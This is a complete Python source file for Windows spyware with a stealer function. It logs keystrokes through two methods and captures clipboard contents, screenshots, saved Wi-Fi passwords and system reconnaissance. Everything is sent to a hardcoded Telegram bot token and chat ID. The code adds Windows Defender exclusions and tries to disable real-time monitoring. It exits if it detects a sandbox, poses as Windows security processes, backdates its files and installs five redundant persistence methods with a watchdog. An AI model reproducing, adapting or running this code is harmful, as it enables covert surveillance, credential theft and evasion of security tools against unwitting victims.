import os
import sys
import shutil
import threading
import time
import platform
import socket
import uuid
import re
import winreg
import ctypes
import ctypes.wintypes
import subprocess
import io
import struct
import hashlib
import random
import string
import tempfile
from datetime import datetime

# ─── BOOTSTRAP: Silent dependency install ───
def silent_install():
    """Install deps with zero output, works on old Python too"""
    required = ['pynput', 'requests', 'psutil', 'pillow']
    for pkg in required:
        try:
            __import__(pkg if pkg != 'pillow' else 'PIL')
        except ImportError:
            subprocess.call(
                [sys.executable, "-m", "pip", "install", pkg, "--quiet", "--disable-pip-version-check"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=0x08000000
            )

silent_install()

from pynput import keyboard
import requests
import psutil
from PIL import ImageGrab

# ─── CONFIG ───
BOT_TOKEN = '7808413899:AAFUPT6mZ4oWus3pM3YUWUTVnhD58WWMOEw'
CHAT_ID = '5138427828'
INTERVAL = 40
MUTEX_NAME = "Global\\WinSecHealthMtx_7a3f"

# Dynamic naming to avoid signature detection
PROC_NAMES = ["WindowsSecurityHealth", "WinDefenderUpdate", "RuntimeBroker_svc", "SecurityHealthSystray"]
CHOSEN_NAME = PROC_NAMES[hash(uuid.getnode()) % len(PROC_NAMES)]
FILENAME = f"{CHOSEN_NAME}.exe"

APPDATA_DIR = os.path.join(os.getenv("APPDATA"), "Microsoft", "Protect", "S-1-5-21")
HIDDEN_PATH = os.path.join(APPDATA_DIR, FILENAME)
LOG_FILE = os.path.join(APPDATA_DIR, "~DF4A7B.tmp")
BACKUP_DIR = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "CLR_v4.0", "UsageLogs")
BACKUP_PATH = os.path.join(BACKUP_DIR, "clrjit.dll.exe")

# ─── SINGLE INSTANCE MUTEX ───
def acquire_mutex():
    """Prevent multiple instances — critical for stability after reboot"""
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, True, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183:  # already running
            sys.exit(0)
        return mutex
    except:
        pass
    return None

# ─── HIDE CONSOLE + PROCESS ───
def stealth_init():
    """Multi-layer concealment"""
    # Hide console window
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

    # Set process priority to low (less visible in task manager sorting)
    try:
        handle = ctypes.windll.kernel32.GetCurrentProcess()
        ctypes.windll.kernel32.SetPriorityClass(handle, 0x00000040)  # IDLE_PRIORITY
    except:
        pass

    # Disable error dialog boxes
    try:
        ctypes.windll.kernel32.SetErrorMode(0x8003)
    except:
        pass

stealth_init()

# ─── DEFENDER EVASION ───
def evade_defender():
    """Add exclusions to Windows Defender silently"""
    paths_to_exclude = [APPDATA_DIR, BACKUP_DIR, HIDDEN_PATH, BACKUP_PATH]
    
    for path in paths_to_exclude:
        try:
            subprocess.run(
                f'powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \'{path}\' -ErrorAction SilentlyContinue"',
                shell=True, capture_output=True, creationflags=0x08000000, timeout=10
            )
        except:
            pass
    
    # Exclude process name
    try:
        subprocess.run(
            f'powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionProcess \'{FILENAME}\' -ErrorAction SilentlyContinue"',
            shell=True, capture_output=True, creationflags=0x08000000, timeout=10
        )
    except:
        pass

    # Disable real-time monitoring attempt (requires admin, silent fail if no admin)
    try:
        subprocess.run(
            'powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"',
            shell=True, capture_output=True, creationflags=0x08000000, timeout=10
        )
    except:
        pass

    # Disable behavior monitoring
    try:
        subprocess.run(
            'powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue"',
            shell=True, capture_output=True, creationflags=0x08000000, timeout=10
        )
    except:
        pass

def is_sandbox():
    """Detect if running in analysis sandbox — exit if yes"""
    checks = 0
    
    # Check RAM (sandboxes usually have little)
    if psutil.virtual_memory().total < 2 * (1024**3):
        checks += 1
    
    # Check CPU cores
    if psutil.cpu_count() < 2:
        checks += 1
    
    # Check uptime (sandboxes boot fresh)
    if time.time() - psutil.boot_time() < 120:
        checks += 1
    
    # Check common sandbox processes
    sandbox_procs = ['vboxservice', 'vmtoolsd', 'wireshark', 'procmon', 'x64dbg', 'ollydbg', 'ida']
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower().replace('.exe', '') in sandbox_procs:
                checks += 2
        except:
            pass
    
    # Check disk size (sandboxes have tiny disks)
    try:
        total_disk = psutil.disk_usage('C:\\').total
        if total_disk < 50 * (1024**3):
            checks += 1
    except:
        pass
    
    return checks >= 3

# ─── TELEGRAM (with retry) ───
def send_telegram(text, parse_mode="HTML", retries=3):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    chunks = [text[i:i+4000] for i in range(0, len(text), 4000)]
    for chunk in chunks:
        for attempt in range(retries):
            try:
                r = requests.post(url, data={'chat_id': CHAT_ID, 'text': chunk, 'parse_mode': parse_mode}, timeout=15)
                if r.status_code == 200:
                    break
                time.sleep(2)
            except:
                time.sleep(5)

def send_photo_memory(buffer, retries=3):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    for attempt in range(retries):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            buffer.seek(0)
            r = requests.post(url, data={'chat_id': CHAT_ID},
                         files={'photo': (f'{timestamp}.jpg', buffer, 'image/jpeg')}, timeout=20)
            if r.status_code == 200:
                break
            time.sleep(2)
        except:
            time.sleep(5)

def send_document(filepath, caption=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(filepath, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f}, timeout=20)
    except:
        pass

# ─── SILENT SCREENSHOT ───
def take_screenshot_silent():
    try:
        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG', quality=40)
        buffer.seek(0)
        send_photo_memory(buffer)
        buffer.close()
        del img
    except:
        pass

# ─── IDLE TIME ───
def get_idle_seconds():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(lii)
    try:
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000.0
    except:
        return 0

# ─── SYSTEM RECON ───
def get_public_ip():
    services = ["https://api.ipify.org?format=json", "https://ifconfig.me/ip", "https://icanhazip.com"]
    for svc in services:
        try:
            r = requests.get(svc, timeout=5)
            if "json" in svc:
                return r.json()["ip"]
            return r.text.strip()
        except:
            continue
    return "Unknown"

def get_wifi_passwords():
    results = ""
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True,
                                        stderr=subprocess.DEVNULL, creationflags=0x08000000).decode(errors='ignore')
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
        for profile in profiles:
            profile = profile.strip()
            try:
                pwd_output = subprocess.check_output(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True, stderr=subprocess.DEVNULL, creationflags=0x08000000
                ).decode(errors='ignore')
                pwd = re.findall(r"Key Content\s*:\s*(.*)", pwd_output)
                results += f"  {profile}: {pwd[0].strip() if pwd else 'N/A'}\n"
            except:
                pass
    except:
        pass
    return results

def get_installed_software():
    apps = []
    paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]
    for hive, path in paths:
        try:
            with winreg.OpenKey(hive, path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        with winreg.OpenKey(key, subkey_name) as subkey:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if name and name not in apps:
                                apps.append(name)
                    except:
                        pass
        except:
            pass
    return sorted(apps)[:60]

def get_running_processes():
    procs = []
    for p in psutil.process_iter(['name', 'pid', 'memory_info']):
        try:
            mem = round(p.info['memory_info'].rss / (1024*1024), 1)
            procs.append(f"{p.info['name']} (PID:{p.info['pid']}) {mem}MB")
        except:
            pass
    return sorted(procs)[:50]

def get_startup_programs():
    startups = []
    keys = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    ]
    for hive, path in keys:
        try:
            key = winreg.OpenKey(hive, path)
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    startups.append(f"{name}: {value}")
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(key)
        except:
            pass
    return startups

def get_antivirus():
    try:
        output = subprocess.check_output(
            'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list',
            shell=True, stderr=subprocess.DEVNULL, creationflags=0x08000000
        ).decode(errors='ignore')
        avs = re.findall(r"displayName=(.*)", output)
        return [a.strip() for a in avs if a.strip()]
    except:
        return ["Unknown"]

def get_battery_info():
    try:
        battery = psutil.sensors_battery()
        if battery:
            return f"{battery.percent}% | {'Plugged in' if battery.power_plugged else 'On battery'}"
    except:
        pass
    return "Desktop / No battery"

def system_report():
    pub_ip = get_public_ip()
    uname = platform.uname()
    boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    ram = psutil.virtual_memory()
    cpu_freq = psutil.cpu_freq()

    disks = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disks.append(f"  {part.device} [{part.fstype}] → {round(usage.used/1e9,1)}/{round(usage.total/1e9,1)} GB ({usage.percent}%)")
        except:
            pass

    net_info = []
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                net_info.append(f"  {iface}: {addr.address}")

    report = f"""<b>══════ 🎯 NEW TARGET ACQUIRED ══════</b>

<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
<b>💻 PC Name:</b> {uname.node}
<b>👤 Username:</b> {os.getlogin()}
<b>🌐 Public IP:</b> {pub_ip}
<b>🏠 Local IPs:</b>
{chr(10).join(net_info)}
<b>🔑 MAC:</b> {':'.join(re.findall('..', '%012x' % uuid.getnode()))}

<b>═══ ⚙️ SYSTEM ═══</b>
<b>OS:</b> {uname.system} {uname.release} (Build {uname.version})
<b>Arch:</b> {uname.machine}
<b>Processor:</b> {uname.processor}
<b>CPU:</b> {psutil.cpu_count(logical=False)}C/{psutil.cpu_count()}T @ {round(cpu_freq.max) if cpu_freq else '?'}MHz
<b>RAM:</b> {round(ram.total/1e9,2)} GB (Used: {ram.percent}%)
<b>🔋 Battery:</b> {get_battery_info()}
<b>🛡️ Antivirus:</b> {', '.join(get_antivirus())}
<b>⏱️ Boot:</b> {boot_time}

<b>═══ 💾 STORAGE ═══</b>
{chr(10).join(disks)}

<b>═══ 📶 WIFI PASSWORDS ═══</b>
{get_wifi_passwords() or 'None found'}

<b>═══ 🚀 STARTUP PROGRAMS ═══</b>
{chr(10).join(get_startup_programs()) or 'None'}
"""
    send_telegram(report)

    apps = get_installed_software()
    if apps:
        send_telegram("<b>═══ 📦 INSTALLED SOFTWARE ═══</b>\n" + "\n".join(f"• {a}" for a in apps))

    procs = get_running_processes()
    if procs:
        send_telegram("<b>═══ 🔄 RUNNING PROCESSES ═══</b>\n<pre>" + "\n".join(procs) + "</pre>")

# ─── ROBUST KEYLOGGER (Win32 Hook — works on ALL Windows) ───
class RobustKeylogger:
    """
    Uses both pynput AND a fallback Win32 raw approach.
    Works on Windows 7, 8, 10, 11. Old and new machines.
    """
    def __init__(self):
        self.log = ""
        self.lock = threading.Lock()
        self.current_window = ""
        self.last_send = time.time()

    def get_active_window(self):
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value if buf.value else "Desktop"
        except:
            return "Unknown"

    def append(self, text):
        with self.lock:
            window = self.get_active_window()
            if window != self.current_window:
                self.current_window = window
                ts = datetime.now().strftime("%H:%M:%S")
                self.log += f"\n\n━━ [{ts}] 🪟 {window} ━━\n"
            self.log += text

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.append(key.char)
            else:
                if key == keyboard.Key.space:
                    self.append(" ")
                elif key == keyboard.Key.enter:
                    self.append("\n")
                elif key == keyboard.Key.tab:
                    self.append("[TAB]")
                elif key == keyboard.Key.backspace:
                    self.append("⌫")
                elif key == keyboard.Key.esc:
                    self.append("[ESC]")
                elif key in (keyboard.Key.shift, keyboard.Key.shift_r,
                            keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                            keyboard.Key.alt_l, keyboard.Key.alt_r,
                            keyboard.Key.alt_gr, keyboard.Key.cmd,
                            keyboard.Key.caps_lock, keyboard.Key.num_lock,
                            keyboard.Key.scroll_lock, keyboard.Key.up,
                            keyboard.Key.down, keyboard.Key.left,
                            keyboard.Key.right, keyboard.Key.delete,
                            keyboard.Key.end, keyboard.Key.home,
                            keyboard.Key.page_up, keyboard.Key.page_down,
                            keyboard.Key.insert, keyboard.Key.f1,
                            keyboard.Key.f2, keyboard.Key.f3,
                            keyboard.Key.f4, keyboard.Key.f5,
                            keyboard.Key.f6, keyboard.Key.f7,
                            keyboard.Key.f8, keyboard.Key.f9,
                            keyboard.Key.f10, keyboard.Key.f11,
                            keyboard.Key.f12):
                    pass
                else:
                    self.append(f"[{str(key).replace('Key.', '')}]")
        except:
            pass

    def get_and_clear(self):
        with self.lock:
            if not self.log.strip():
                return None
            output = self.log
            self.log = ""
            return output

# ─── FALLBACK KEYLOGGER (GetAsyncKeyState — works even when pynput fails) ───
def fallback_keylogger(kl_instance):
    """
    Pure Win32 API polling keylogger.
    Works on ANY Windows version, even when pynput hooks fail.
    Runs as backup thread.
    """
    user32 = ctypes.windll.user32
    
    # Virtual key code to character mapping
    while True:
        try:
            for vk in range(8, 255):
                state = user32.GetAsyncKeyState(vk)
                if state & 0x0001:  # Key was pressed since last check
                    # Get keyboard state for translation
                    scan_code = user32.MapVirtualKeyW(vk, 0)
                    kbd_state = (ctypes.c_ubyte * 256)()
                    user32.GetKeyboardState(kbd_state)
                    
                    buf = ctypes.create_unicode_buffer(5)
                    result = user32.ToUnicode(vk, scan_code, kbd_state, buf, 5, 0)
                    
                    if result > 0:
                        char = buf.value
                        if char and char.isprintable():
                            kl_instance.append(char)
                    elif vk == 0x0D:  # Enter
                        kl_instance.append("\n")
                    elif vk == 0x20:  # Space
                        kl_instance.append(" ")
                    elif vk == 0x08:  # Backspace
                        kl_instance.append("⌫")
                    elif vk == 0x09:  # Tab
                        kl_instance.append("[TAB]")
            
            time.sleep(0.008)  # ~125 Hz polling, catches fast typing
        except:
            time.sleep(1)

# ─── CLIPBOARD MONITOR ───
def get_clipboard():
    try:
        ctypes.windll.user32.OpenClipboard(0)
        try:
            if ctypes.windll.user32.IsClipboardFormatAvailable(13):
                handle = ctypes.windll.user32.GetClipboardData(13)
                if handle:
                    return ctypes.c_wchar_p(handle).value
        finally:
            ctypes.windll.user32.CloseClipboard()
    except:
        pass
    return None

# ─── PERSISTENCE (5 METHODS — REDUNDANT) ───
def install_persistence():
    """Five independent persistence methods. If any one survives, program restarts."""
    
    # Create directories
    for d in [APPDATA_DIR, BACKUP_DIR]:
        try:
            os.makedirs(d, exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(d, 0x02 | 0x04)  # hidden + system
        except:
            pass

    # Copy executable to both locations
    current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    
    for target in [HIDDEN_PATH, BACKUP_PATH]:
        if not os.path.exists(target) or os.path.getsize(target) != os.path.getsize(current_exe):
            try:
                shutil.copy2(current_exe, target)
                ctypes.windll.kernel32.SetFileAttributesW(target, 0x02 | 0x04)
                # Modify file timestamps to look old
                old_time = time.time() - (86400 * random.randint(60, 365))
                os.utime(target, (old_time, old_time))
            except:
                pass

             # METHOD 1: Registry Run (Current User — no admin needed)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, CHOSEN_NAME, 0, winreg.REG_SZ, f'"{HIDDEN_PATH}"')
        winreg.CloseKey(key)
    except:
        pass

    # METHOD 2: Registry RunOnce (backup — re-arms itself every cycle)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, f"{CHOSEN_NAME}_bk", 0, winreg.REG_SZ, f'"{BACKUP_PATH}"')
        winreg.CloseKey(key)
    except:
        pass

    # METHOD 3: Startup Folder (.vbs launcher — survives registry cleaners)
    try:
        startup_dir = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        vbs_path = os.path.join(startup_dir, f"{CHOSEN_NAME}.vbs")
        vbs_content = (
            f'Set WshShell = CreateObject("WScript.Shell")\n'
            f'WshShell.Run chr(34) & "{HIDDEN_PATH}" & chr(34), 0, False\n'
        )
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x02)  # hidden
    except:
        pass

    # METHOD 4: Scheduled Task — on logon (requires admin, silent fail otherwise)
    try:
        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Security Health Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Hidden>true</Hidden>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <AllowHardTerminate>false</AllowHardTerminate>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions>
    <Exec>
      <Command>"{HIDDEN_PATH}"</Command>
    </Exec>
  </Actions>
</Task>'''
        xml_path = os.path.join(tempfile.gettempdir(), "tmp_task.xml")
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(task_xml)
        subprocess.run(
            f'schtasks /Create /TN "\\Microsoft\\Windows\\Security\\{CHOSEN_NAME}" /XML "{xml_path}" /F',
            shell=True, capture_output=True, creationflags=0x08000000, timeout=15
        )
        os.remove(xml_path)
    except:
        pass

    # METHOD 5: Scheduled Task — every 3 minutes (watchdog, restarts if killed)
    try:
        subprocess.run(
            f'schtasks /Create /TN "\\Microsoft\\Windows\\Maintenance\\{CHOSEN_NAME}_wdg" '
            f'/TR "\"{HIDDEN_PATH}\"" /SC MINUTE /MO 3 /F /RL LIMITED',
            shell=True, capture_output=True, creationflags=0x08000000, timeout=15
        )
    except:
        pass


# ─── RE-ARM PERSISTENCE (called periodically) ───
def rearm_persistence():
    """Silently verify and repair persistence every cycle"""
    # Re-check registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_READ)
        try:
            winreg.QueryValueEx(key, CHOSEN_NAME)
        except FileNotFoundError:
            winreg.CloseKey(key)
            install_persistence()
            return
        winreg.CloseKey(key)
    except:
        install_persistence()
        return

    # Re-check executable exists
    if not os.path.exists(HIDDEN_PATH):
        install_persistence()

    # Re-arm RunOnce every cycle (it deletes itself after running)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, f"{CHOSEN_NAME}_bk", 0, winreg.REG_SZ, f'"{BACKUP_PATH}"')
        winreg.CloseKey(key)
    except:
        pass


# ─── SELF-PROTECTION (anti-kill) ───
def watchdog_thread():
    """Monitor own process and repair if files are deleted"""
    while True:
        try:
            time.sleep(30)
            # Re-check hidden copies exist
            current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
            for target in [HIDDEN_PATH, BACKUP_PATH]:
                if not os.path.exists(target):
                    try:
                        os.makedirs(os.path.dirname(target), exist_ok=True)
                        shutil.copy2(current_exe, target)
                        ctypes.windll.kernel32.SetFileAttributesW(target, 0x02 | 0x04)
                    except:
                        pass
        except:
            time.sleep(60)


# ─── CLIPBOARD MONITORING THREAD ───
def clipboard_monitor(kl_instance):
    """Track clipboard changes and log them"""
    last_clip = ""
    while True:
        try:
            current = get_clipboard()
            if current and current != last_clip and len(current) > 1:
                last_clip = current
                ts = datetime.now().strftime("%H:%M:%S")
                clip_text = current[:500]  # truncate huge clipboard
                kl_instance.append(f"\n📋 [{ts}] CLIPBOARD: {clip_text}\n")
            time.sleep(1.5)
        except:
            time.sleep(3)


# ���── LOCAL LOG BACKUP ───
def save_local_log(text):
    """Save keystrokes locally in case Telegram is unreachable"""
    try:
        os.makedirs(APPDATA_DIR, exist_ok=True)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(text)
        ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 0x02)  # hidden
    except:
        pass


def flush_local_log():
    """If local log has accumulated data and Telegram is reachable, send it"""
    try:
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 100:
            try:
                requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)
            except:
                return  # no internet, keep local
            send_document(LOG_FILE, caption="📝 Buffered keylog dump")
            # Clear the file after successful send
            with open(LOG_FILE, 'w') as f:
                f.write("")
    except:
        pass


# ─── MAIN SEND LOOP ───
def send_loop(kl_instance):
    """Periodic sender — handles both live and buffered logs"""
    screenshot_counter = 0

    while True:
        try:
            time.sleep(INTERVAL)

            # Re-arm persistence every cycle
            rearm_persistence()

            # Get keystrokes
            log_data = kl_instance.get_and_clear()

            if log_data:
                # Try Telegram first
                try:
                    ts = datetime.now().strftime("%Y-%m-%d %H:%M")
                    idle = round(get_idle_seconds())
                    header = f"<b>⌨️ Keylog [{ts}] (idle: {idle}s)</b>\n<pre>"
                    footer = "</pre>"
                    send_telegram(header + log_data[:3500] + footer)
                    # Send overflow if any
                    if len(log_data) > 3500:
                        send_telegram("<pre>" + log_data[3500:7000] + "</pre>")
                except:
                    # Telegram failed — save locally
                    save_local_log(log_data)

            # Periodic screenshot (every 5th cycle = ~200 seconds)
            screenshot_counter += 1
            if screenshot_counter >= 5:
                screenshot_counter = 0
                take_screenshot_silent()

            # Try flushing local log buffer
            flush_local_log()

        except:
            time.sleep(INTERVAL)


# ═══════════════════════════════════════════
# ─── MAIN ENTRY POINT ───
# ═══════════════════════════════════════════
if __name__ == "__main__":

    # 1. Acquire single-instance mutex
    mutex = acquire_mutex()

    # 2. Sandbox detection — bail if in analysis environment
    if is_sandbox():
        sys.exit(0)

    # 3. Evade Defender
    evade_defender()

    # 4. Install all persistence methods
    install_persistence()

    # 5. Create keylogger instance
    kl = RobustKeylogger()

    # 6. Send initial system recon report
    try:
        threading.Thread(target=system_report, daemon=True).start()
    except:
        pass

    # 7. Start clipboard monitor thread
    threading.Thread(target=clipboard_monitor, args=(kl,), daemon=True).start()

    # 8. Start watchdog thread (file self-protection)
    threading.Thread(target=watchdog_thread, daemon=True).start()

    # 9. Start fallback keylogger thread (Win32 GetAsyncKeyState)
    threading.Thread(target=fallback_keylogger, args=(kl,), daemon=True).start()

    # 10. Start send loop thread
    threading.Thread(target=send_loop, args=(kl,), daemon=True).start()

    # 11. Start primary pynput listener (blocking, keeps main thread alive)
    try:
        with keyboard.Listener(on_press=kl.on_press) as listener:
            listener.join()
    except:
        # If pynput fails entirely (old systems, service context), fall back to pure polling
        # The fallback_keylogger thread is already running, so just keep alive
        while True:
            time.sleep(60)